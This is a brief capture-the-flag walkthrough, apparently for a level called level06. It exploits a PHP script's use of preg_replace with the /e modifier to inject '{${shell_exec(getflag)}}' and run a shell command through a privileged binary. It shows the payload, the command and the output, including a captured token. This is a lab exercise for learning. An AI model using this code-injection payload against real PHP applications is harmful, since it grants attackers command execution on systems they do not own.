#On our home we have 2 files : a binary and his related source code in php

#This code file seems to print the content of a file, so our exploit would be a file with some unix command to execute

# After some research, i found a well known security breach in preg_replace with \e 

#This option allow use to evaluate a part of the string given as parameter, so our string will be considered as a php string
#In PHP, we can use the output of a function in a string by using some brackets, so we will use something like :

{${shell_exec(getflag)}}

#shell_exec() have a very relevant name, we can use it to execute a shell command.

#The only difficulty is that our string must match the regex in the preg_replace call, lets look at it

reg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)

regex : (\[x (.*)\])

#To match the regex our string must start by "[x" and finish by "]"

[x {${shell_exec(getflag)}}]

#Et voila, lets execute the binary with our file

./level06 /tmp/azur/test

>>> 
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
